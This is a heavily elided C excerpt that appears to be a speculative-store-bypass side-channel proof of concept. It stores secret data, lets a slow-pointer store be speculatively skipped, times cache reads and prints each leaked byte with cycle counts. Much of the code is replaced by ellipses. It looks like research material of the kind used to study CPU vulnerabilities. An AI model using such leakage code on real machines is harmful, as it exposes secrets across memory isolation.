...
int testfun(int idx) {
  ...
  *memory_slot = secret_read_area;
  ...
  // pipeline_flush();
  //  the following store will be speculatively ignored since its address is
  //  unknown
  *memory_slot__slowptr = public_read_area;
  ...
  asm volatile("" /*"mov $0, %%eax\n\tcpuid\n\tlfence"*/
               ...
               /*in*/
               : "rax", "rbx", "rcx", "rdx", "memory");
  // architectual read from dummy_timey_line, possible microarchitectural read
  // from timey_line
...
int main(void) {
  ...
  for (int idx = 0; idx < 16; idx++) {
    ...
    out_ += sprintf(out_, "%c: %s in %ld cycles (hitrate: %f%%)\n",
                    secret_read_area[idx], results, cycles,
                    100 * hits / (double)cycles);
  }
  printf("%s", out);
  pipeline_flush();
}
